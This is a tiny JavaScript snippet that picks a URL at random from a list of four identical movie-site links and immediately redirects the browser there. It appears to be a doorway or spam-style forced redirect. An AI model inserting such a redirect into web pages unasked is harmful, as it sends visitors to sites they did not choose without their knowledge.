var dataUrl = [
  

'https://zaimovie.com/en/movie',
'https://zaimovie.com/en/movie',
'https://zaimovie.com/en/movie',
'https://zaimovie.com/en/movie'
  
 
];
var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
window.location = randomItem;
